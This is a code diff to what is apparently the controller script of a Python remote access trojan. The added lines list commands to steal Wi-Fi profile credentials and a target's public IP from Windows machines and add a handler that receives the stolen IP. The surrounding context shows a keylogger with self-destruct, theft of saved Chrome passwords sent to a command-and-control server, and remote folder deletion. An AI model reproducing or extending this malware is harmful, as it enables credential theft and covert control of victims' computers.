@@ -195,7 +195,11 @@ keylog_off                    :    To close keylogger and self destruct the logg
 spoof_passwd                  :    To spoof password as a file from trgt machine's browser (windows 10, Chrome browser Version 89.0.4389.90 (Official Build) (64-bit)) and sents to C2Server
 (windows only)
 
+spoof_wlan_creds              :    Spoofs wlan wifi profile creds and public/wan ip of the trgt windows machine
+(Windows only)
+
 spoof_wanip                   :    Spoofs public/wan ip of the trgt machine
+(Windows only)
 
 ''', 'green'))
 			print(colored('You can also use other commands related to networking, etc for linux as well as windows','yellow'))
@@ -241,18 +245,30 @@ spoof_wanip                   :    Spoofs public/wan ip of the trgt machine
 			continue   			     # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
 
-                # Removing folder in linux and Win
+                # Removing folder in linux and Win      ✓
 		elif (cmd[:2] == 'rm' and cmd.find('-r') and len(cmd) > 1) or (cmd[:5] == 'rmdir' and len(cmd) > 1):
 
 			continue 			     # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
 
-		# Password Spoofing from trgt win10 Chrome browser
+		# Password Spoofing from trgt win10 Chrome browser  ✓
 		elif cmd[:12] == "spoof_passwd" and len(cmd) > 1:
 
 			download_file("chrome_creds.txt")
 
 			trgt.settimeout(5)                  # waiting for 5 seconds so that password decrypting and downloading in done with out any error
+
+
+		# Spoof wan/public ip of trgt win10 machine   ✓
+		elif cmd[:11] == "spoof_wanip" and len(cmd) > 1:
+
+			print(colored("[+] Extracting wan/public ip ...", 'green'))
+
+			result1 = recv_eff()
+			result2 = trgt.recv(1024).decode('utf-8')
+
+			print(result1+result2)
+
 
 		# Screenshot    ✓
 
